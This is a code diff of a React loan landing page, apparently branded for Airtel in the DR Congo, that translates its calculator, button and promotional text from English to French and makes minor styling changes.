@@ -21,7 +21,7 @@ function LandingPage({ onApply }: LandingPageProps) {
     return (
         <div style={pageStyle}>
             <div style={headerStyle}>
-                <img src="/airtel.svg" alt="Airtel Congo" style={logoStyle} />
+                <img src="/airtel.svg" alt="Airtel RDC" style={logoStyle} />
                 <button
                     style={menuButtonStyle}
                     onMouseOver={(e) => (e.currentTarget.style.background = "#f0f0f0")}
@@ -36,14 +36,14 @@ function LandingPage({ onApply }: LandingPageProps) {
                     <h1
                         style={{
                             textAlign: "center",
-                            fontSize: "34px",
+                            fontSize: "32px",
                             fontWeight: "700",
                             marginBottom: "12px",
                             color: "#1a1a1a",
                             letterSpacing: "-0.5px",
                         }}
                     >
-                        Get Your Loan Approved Fast
+                        Obtenez votre prêt rapidement
                     </h1>
                     <p
                         style={{
@@ -54,13 +54,13 @@ function LandingPage({ onApply }: LandingPageProps) {
                             lineHeight: "1.5",
                         }}
                     >
-                        Quick approval • Competitive rates • Flexible terms
+                        Approbation rapide • Taux compétitifs • Conditions flexibles
                     </p>
 
                     <div
                         style={{
                             background: "linear-gradient(135deg, #f5f7fa 0%, #f0f3f7 100%)",
-                            padding: "24px 12px",
+                            padding: "24px 16px",
                             borderRadius: "12px",
                             marginBottom: "32px",
                             border: "1px solid #e8ecf1",
@@ -74,7 +74,7 @@ function LandingPage({ onApply }: LandingPageProps) {
                                 fontWeight: "700",
                             }}
                         >
-                            Loan Calculator
+                            Calculateur de prêt
                         </h3>
 
                         <div style={{ marginBottom: "24px" }}>
@@ -88,7 +88,7 @@ function LandingPage({ onApply }: LandingPageProps) {
                                 <span
                                     style={{ fontSize: "15px", color: "#555", fontWeight: "600" }}
                                 >
-                                    Loan Amount
+                                    Montant du prêt
                                 </span>
                                 <span
                                     style={{ fontSize: "18px", fontWeight: "700", color: "#e40000" }}
@@ -136,12 +136,12 @@ function LandingPage({ onApply }: LandingPageProps) {
                                 <span
                                     style={{ fontSize: "15px", color: "#555", fontWeight: "600" }}
                                 >
-                                    Loan Term
+                                    Durée du prêt
                                 </span>
                                 <span
                                     style={{ fontSize: "18px", fontWeight: "700", color: "#e40000" }}
                                 >
-                                    {loanTerm} months
+                                    {loanTerm} mois
                                 </span>
                             </div>
                             <input
@@ -168,8 +168,8 @@ function LandingPage({ onApply }: LandingPageProps) {
                                     fontWeight: "500",
                                 }}
                             >
-                                <span>6 months</span>
-                                <span>60 months</span>
+                                <span>6 mois</span>
+                                <span>60 mois</span>
                             </div>
                         </div>
 
@@ -187,7 +187,7 @@ function LandingPage({ onApply }: LandingPageProps) {
                             <span
                                 style={{ fontSize: "15px", color: "#555", fontWeight: "600" }}
                             >
-                                Monthly Payment
+                                Paiement mensuel
                             </span>
                             <span
                                 style={{ fontSize: "28px", fontWeight: "700", color: "#e40000" }}
@@ -211,7 +211,7 @@ function LandingPage({ onApply }: LandingPageProps) {
                                 "0 4px 12px rgba(228, 0, 0, 0.3)";
                         }}
                     >
-                        APPLY NOW
+                        DEMANDER MAINTENANT
                     </button>
 
                     <div
@@ -234,10 +234,10 @@ function LandingPage({ onApply }: LandingPageProps) {
                                     marginBottom: "6px",
                                 }}
                             >
-                                Fast Approval
+                                Approbation rapide
                             </div>
                             <div style={{ fontSize: "12px", color: "#777" }}>
-                                Within 24 hours
+                                En moins de 24h
                             </div>
                         </div>
                         <div style={{ textAlign: "center" }}>
@@ -250,9 +250,9 @@ function LandingPage({ onApply }: LandingPageProps) {
                                     marginBottom: "6px",
                                 }}
                             >
-                                Low Rates
+                                Taux bas
                             </div>
-                            <div style={{ fontSize: "12px", color: "#777" }}>From 8%</div>
+                            <div style={{ fontSize: "12px", color: "#777" }}>À partir de 8%</div>
                         </div>
                         <div style={{ textAlign: "center" }}>
                             <div style={{ fontSize: "32px", marginBottom: "10px" }}>🔒</div>
@@ -264,15 +264,15 @@ function LandingPage({ onApply }: LandingPageProps) {
                                     marginBottom: "6px",
                                 }}
                             >
-                                Secure
+                                Sécurisé
                             </div>
-                            <div style={{ fontSize: "12px", color: "#777" }}>Bank-level</div>
+                            <div style={{ fontSize: "12px", color: "#777" }}>Niveau bancaire</div>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <div style={footerStyle}>© 2025 Airtel Congo</div>
+            <div style={footerStyle}>© 2025 Airtel RDC</div>
         </div>
     );
 }
